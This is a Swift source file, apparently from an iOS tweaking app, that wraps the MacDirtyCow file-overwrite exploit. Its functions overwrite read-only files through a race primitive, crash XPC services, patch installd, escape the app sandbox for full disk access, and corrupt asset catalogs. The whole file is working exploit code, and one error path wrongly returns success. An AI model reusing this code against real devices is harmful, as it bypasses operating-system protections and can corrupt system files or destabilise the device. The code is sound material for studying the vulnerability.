import Exploit

extension String: LocalizedError {
    public var errorDescription: String? { return self }
}

public enum MacDirtyCow {
    public static var isMDCSafe: Bool = true
    
    public static func restartBackboard() {
        respringBackboard()
    }
    
    public static func restartFrontboard() {
        respringFrontboard()
    }
    // MARK: - Literally black magic.

    public static func overwriteFileWithDataImpl(originPath: String, replacementData: Data) -> Bool {
        // open and map original font
        let fd = open(originPath, O_RDONLY | O_CLOEXEC)
        if fd == -1 {
            // TODO: Make this throw??? Would be cool ngl
            print("Could not open target file")
            return false
        }
        defer { close(fd) }
        // check size of font
        let originalFileSize = lseek(fd, 0, SEEK_END)
        guard originalFileSize >= replacementData.count else {
            print("Original file: \(originalFileSize)")
            print("Replacement file: \(replacementData.count)")
            print("File too big!")
            return false
        }
        lseek(fd, 0, SEEK_SET)

        // Map the font we want to overwrite so we can mlock it
        let fileMap = mmap(nil, replacementData.count, PROT_READ, MAP_SHARED, fd, 0)
        if fileMap == MAP_FAILED {
            print("Failed to map")
            return false
        }
        // mlock so the file gets cached in memory
        guard mlock(fileMap, replacementData.count) == 0 else {
            print("Failed to mlock")
            return true
        }

        // for every 16k chunk, rewrite
        print(Date())
        for chunkOff in stride(from: 0, to: replacementData.count, by: 0x4000) {
            print(String(format: "%lx", chunkOff))
            let dataChunk = replacementData[chunkOff..<min(replacementData.count, chunkOff + 0x4000)]
            var overwroteOne = false
            for _ in 0..<2 {
                let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
                    unaligned_copy_switch_race(
                        fd, Int64(chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count
                    )
                }
                if overwriteSucceeded {
                    overwroteOne = true
                    print("Successfully overwrote!")
                    break
                }
                print("try again?!")
            }
            guard overwroteOne else {
                print("Failed to overwrite")
                return false
            }
        }
        print(Date())
        print("Successfully overwrote!")
        return true
    }

    public static func xpc_crash(_ serviceName: String) {
        let buffer = UnsafeMutablePointer<CChar>.allocate(capacity: serviceName.utf8.count)
        defer { buffer.deallocate() }
        strcpy(buffer, serviceName)
        xpc_crasher(buffer)
    }
    
    public static func patch_installd() -> Bool {
        return installd_patch()
    }

    public static func unsandbox() throws {
        var errormessage = ""
        if #available(iOS 16.2, *) {
            throw "Your device is incompatible"
        } else {
            grant_full_disk_access { error in
                if error != nil {
                    errormessage = String(describing: error?.localizedDescription ?? "unknown?!")
                }
            }

            if errormessage != "" {
                throw errormessage
            }
        }
    }
    
    public static func toggleCatalogCorruption(at path: String, corrupt: Bool) throws {
        let fd = open(path, O_RDONLY | O_CLOEXEC)
        guard fd != -1 else { throw "Could not open target file" }
        defer { close(fd) }
        
        let buffer = UnsafeMutablePointer<Int>.allocate(capacity: 0x4000)
        let n = read(fd, buffer, 0x4000)
        var byteArray = [UInt8](Data(bytes: buffer, count: n))
        
        let treeBytes: [UInt8] = [0, 0, 0, 0, 0x74, 0x72, 0x65, 0x65, 0, 0, 0]
        let corruptBytes: [UInt8] = [67, 111, 114, 114, 117, 112, 116, 84, 104, 105, 76]
        
        let findBytes = corrupt ? treeBytes : corruptBytes
        let replaceBytes = corrupt ? corruptBytes : treeBytes
        
        var startIndex = 0
        while startIndex <= byteArray.count - findBytes.count {
            let endIndex = startIndex + findBytes.count
            let subArray = Array(byteArray[startIndex..<endIndex])
            
            if subArray == findBytes {
                byteArray.replaceSubrange(startIndex..<endIndex, with: replaceBytes)
                startIndex += replaceBytes.count
            } else {
                startIndex += 1
            }
        }
        
        let overwriteSucceeded = byteArray.withUnsafeBytes { dataChunkBytes in
            unaligned_copy_switch_race(
                fd, 0, dataChunkBytes.baseAddress, dataChunkBytes.count)
        }
        print("overwriteSucceeded = \(overwriteSucceeded)")
    }
}
